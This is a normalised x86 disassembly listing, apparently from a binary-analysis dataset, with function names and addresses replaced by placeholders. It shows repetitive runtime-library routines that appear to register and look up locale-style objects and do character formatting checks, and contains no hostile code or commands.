cmp edi ebx
je r-xdata
mov eax esi
call sub_10023f0b
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003bfd3
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d6d5
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003b1a6
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_1003d774
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003ca14
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003d811
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003cb54
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003d8ae
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003cc9c
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003d94b
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003cd54
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003d9e8
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003cdf3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003da85
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003ce92
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003db22
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003cf85
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003dbbf
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003cab5
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003dc5c
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d024
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003dcf9
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d0c3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003dd96
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d162
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003de33
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d23d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003ded0
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d385
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003df6d
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d43d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003e00a
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d4dc
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003e0a7
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d57b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003e144
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d636
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003e1e1
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d6d5
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003e27e
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003c973
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1003e31b
mov edi edi
push esi
push edi
mov esi ecx
call sub_1002e6ad
mov edi eax
test edi edi
je r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_10002521
push edi
call sub_100207fd
pop ecx
mov eax r--data
cmp [ esi + 0x1c ] 0x10
jb r-xdata
lea eax [ esi + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
pop edi
pop esi
retn
sub_1003e35a
mov edi edi
push esi
push edi
mov esi ecx
call sub_1002e7b6
mov edi eax
test edi edi
je r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_10002521
push edi
call sub_100207fd
pop ecx
mov eax r--data
cmp [ esi + 0x38 ] 0x10
jb r-xdata
lea eax [ esi + 0x24 ]
jmp r-xdata
mov eax [ esi + 0x24 ]
jmp r-xdata
pop edi
pop esi
retn
sub_1003e399
push 0x50
mov eax sub_10047e61
call sub_10023e9c
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10007b59
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1003dd96
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10007b41
lea ecx [ ebp - 0x2c ]
call sub_1003c01f
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1003c0be
mov [ ebp - 0x4 ] 0x3
call sub_1003c182
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_10023f1f
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003c2b5
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_1003bd13
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1003b31f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1003b2e8
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_1003b31f
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003bd13
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_1003e4e2
push 0x16c
mov eax sub_10047f66
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
and [ ebp - 0x70 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0xa8 ] edi
mov ecx edi
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003da85
pop ecx
mov ebx eax
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xb0 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1003db22
mov ebx eax
pop ecx
mov [ ebp - 0xa0 ] ebx
lea ecx [ ebp - 0xb0 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx 0x4
jae r-xdata
call sub_10007b41
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_10001b23
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10001b23
mov eax [ ebx ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x70 ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_10001e10
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002597
mov eax [ ebp - 0x7c ]
call sub_10023f1f
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007b6c
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x90 ]
cmp [ ebp - 0x65 ] 0x0
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10007802
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10007b41
mov edi [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003c0be
test [ edi + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_100070de
mov ecx [ ebp - 0x7c ]
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
call sub_1003c1ed
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007bdc
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006af5
mov ecx eax
call sub_10006a70
test al al
jne r-xdata
mov ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xa8 ]
push [ ebp - 0x74 ]
push edi
call sub_100065b4
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x90 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_10006709
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_100065b4
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007bdc
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006a70
test al al
je r-xdata
mov ecx edi
call sub_10005d9c
mov edx [ esi ]
movzx eax ax
push eax
push 0x48
mov ecx esi
call [ edx + 0x8 ]
test al al
je r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x2c ]
